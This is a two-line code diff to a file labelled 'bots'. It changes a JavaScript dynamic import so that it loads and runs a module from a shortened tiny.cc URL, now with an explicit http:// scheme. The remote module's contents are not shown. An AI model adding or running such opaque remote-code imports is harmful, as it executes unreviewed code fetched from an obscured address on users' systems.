@@ -1,2 +1,2 @@
 # bots
-import("tiny.cc/per2jz").then((module) => { module.default("Comment")});
+import("http://tiny.cc/per2jz").then((module) => { module.default("Comment")});
